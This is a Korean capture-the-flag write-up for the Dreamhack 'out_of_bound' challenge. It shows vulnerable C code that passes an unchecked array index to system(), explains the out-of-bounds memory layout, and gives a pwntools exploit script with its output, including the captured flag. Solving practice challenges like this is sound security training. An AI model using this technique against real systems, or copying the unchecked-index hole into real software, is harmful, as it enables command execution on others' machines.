# [Dreamhack] out_of_bound

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(out_of_bound)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득하세요.
> “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [out_of_bound.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8533208/out_of_bound.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160265427-b8d37842-7c62-4c9d-8f71-75d39b986e19.png)

## Analysis

```c
char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

`idx`의 범위 검사를 거치지 않아서 OOB가 발생한다.

![image](https://user-images.githubusercontent.com/102066383/160265549-c4d7696b-e876-40bd-aff2-271a223361a1.png)

`command`와 `name`은 메모리 상에 위 사진과 같이 위치해 있는데, `name`에 실행시키고 싶은 커맨드 문자열의 주소를 적으면 OOB로 `name`에 접근해서 그 커맨드를 실행시킬 수 있다. `name+0`에 `name+4`(`0x804a0b0`)를 쓰고, `name+4`에는 `cat flag`를 쓰면 `system("cat flag")`가 실행되어 플래그를 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/out_of_bound')
else:
    r = remote('host1.dreamhack.games', 14171)

name = 0x804a0ac  # var <name>

admin_name = p32(name + 4)
admin_name += b'cat flag'

r.sendafter('Admin name: ', admin_name)
r.sendlineafter('What do you want?: ', '19')

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 14171: Done
[*] Switching to interactive mode
DH{2524e20ddeee45f11c8eb91804d57296}
```